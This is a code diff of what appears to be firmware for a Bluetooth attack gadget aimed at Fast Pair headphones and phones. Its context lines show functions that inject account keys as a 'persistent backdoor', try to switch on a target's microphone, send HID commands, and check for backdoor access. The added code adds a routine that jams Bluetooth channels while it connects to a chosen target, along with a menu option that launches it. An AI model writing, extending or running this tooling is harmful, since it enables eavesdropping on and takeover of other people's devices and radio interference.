@@ -43,13 +43,13 @@ class PairingCaptureCallback : public NimBLEScanCallbacks {
                 uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                 
                 if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
-                    Serial.printf("\n📡 Found FastPair device: %s\n", 
+                    Serial.printf("\n Found FastPair device: %s\n", 
                                   advertisedDevice->getName().c_str());
                     
                     if(mfg.length() >= 4) {
                         uint8_t msg_type = mfg[2];
                         if(msg_type == 0x00) {
-                            Serial.println("📱 Phone detected!");
+                            Serial.println("Phone detected!");
                             g_capturedPhoneAddr = advertisedDevice->getAddress();
                         } else if(msg_type == 0x10 || msg_type == 0x20) {
                             Serial.println("🎧 Target detected!");
@@ -831,7 +831,7 @@ bool captureLivePairing(const char* scanName) {
         }
         
         if(gotPhone && gotTarget) {
-            Serial.println("\n✅ Both devices detected!");
+            Serial.println("\n Both devices detected!");
             break;
         }
         
@@ -949,7 +949,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
             delay(100);
             std::string ack = pAccountChar->readValue();
             if(ack.length() > 0) {
-                Serial.println("✅ ACCOUNT KEY INJECTED!");
+                Serial.println("ACCOUNT KEY INJECTED!");
                 memcpy(keys.account_key, account_key, 16);
                 keys.keys_captured = true;
                 showSuccessMessage("PERSISTENT BACKDOOR INSTALLED!");
@@ -961,7 +961,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
     NimBLEDevice::deleteClient(pTargetClient);
     
     if(keys.keys_captured) {
-        Serial.println("\n🎯 MITM SUCCESSFUL!");
+        Serial.println("\n MITM SUCCESSFUL!");
         return true;
     }
     
@@ -984,7 +984,7 @@ bool activateMicrophoneHijack(NimBLEAddress target) {
         if(pAudioChar && pAudioChar->canWrite()) {
             uint8_t enable_mic[] = {0x01, 0x00};
             if(pAudioChar->writeValue(enable_mic, 2, true)) {
-                Serial.println("⚠️  Microphone access attempted");
+                Serial.println("Microphone access attempted");
                 showWarningMessage("MIC ACCESS ATTEMPTED");
             }
         }
@@ -1026,7 +1026,7 @@ bool simulateHIDKeyboard(NimBLEAddress target) {
                         uint8_t media_play[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                         
                         if(pChar->writeValue(media_play, 8, false)) {
-                            Serial.println("⚠️  HID command sent");
+                            Serial.println("HID command sent");
                             showWarningMessage("HID COMMAND INJECTED");
                         }
                     }
@@ -1066,11 +1066,11 @@ bool checkBackdoorAccess(NimBLEAddress target) {
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService) {
-        Serial.println("✅ FastPair service accessible");
+        Serial.println("FastPair service accessible");
         
         NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
         if(pChar && pChar->canWrite()) {
-            Serial.println("✅ Can write to KBP characteristic!");
+            Serial.println("Can write to KBP characteristic!");
             showSuccessMessage("BACKDOOR ACTIVE!");
             pClient->disconnect();
             NimBLEDevice::deleteClient(pClient);
@@ -1080,6 +1080,62 @@ bool checkBackdoorAccess(NimBLEAddress target) {
     
     pClient->disconnect();
     NimBLEDevice::deleteClient(pClient);
+    return false;
+}
+
+bool jamAndConnectEnhanced(NimBLEAddress target) {
+    Serial.println("\n=== ENHANCED JAM & CONNECT ===");
+    
+    showDeviceInfoScreen("JAM & CONNECT", 
+        {"Starting enhanced jam...", 
+         "Jamming for 8 seconds",
+         "Attempting connection",
+         "Using fixed connection logic"}, 
+        TFT_YELLOW, TFT_BLACK);
+    
+    startJammer();
+    
+    NimBLEClient* pClient = nullptr;
+    bool connected = false;
+    unsigned long startTime = millis();
+    
+    Serial.println("Starting jam/connect loop...");
+    
+    while(millis() - startTime < 8000 && !connected) {
+        updateJammerChannel();
+        
+        NimBLEClient* tempClient = nullptr;
+        if(connectWithRetry(target, 1, &tempClient)) {
+            connected = true;
+            pClient = tempClient;
+            Serial.println("Connected while jamming!");
+            break;
+        }
+        
+        delay(200);
+    }
+    
+    stopJammer();
+    
+    if(connected && pClient) {
+        showSuccessMessage("CONNECTED WHILE JAMMING!");
+        
+        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+        if(pService) {
+            Serial.println("FastPair service accessible after jam!");
+            showAdaptiveMessage("FastPair accessible!", "", "", "", TFT_GREEN, false, true);
+        }
+        
+        pClient->disconnect();
+        NimBLEDevice::deleteClient(pClient);
+        return true;
+    }
+    
+    if(pClient) {
+        NimBLEDevice::deleteClient(pClient);
+    }
+    
+    showErrorMessage("Enhanced jam & connect failed");
     return false;
 }
 
@@ -1314,6 +1370,17 @@ void jamAndConnectMenu() {
         }
     }
     std::vector<Option> jamOptions;
+    jamOptions.push_back({"[Enhanced Jam & Connect]", [&]() {
+        String targetInfo = selectTargetFromScan("SELECT TARGET");
+        if(targetInfo.isEmpty()) return;
+        int colonPos = targetInfo.lastIndexOf(':');
+        String selectedMAC = targetInfo.substring(0, colonPos);
+        uint8_t addrType = targetInfo.substring(colonPos + 1).toInt();
+        NimBLEAddress target(selectedMAC.c_str(), addrType);
+        if(requireSimpleConfirmation("Run enhanced jam & connect?")) {
+            jamAndConnectEnhanced(target);
+        }
+    }});
     jamOptions.push_back({"[Scan then Jam Connect]", [&]() {
         String selectedInfo = selectTargetFromScan("SCAN TARGET");
         if(selectedInfo.isEmpty()) return;
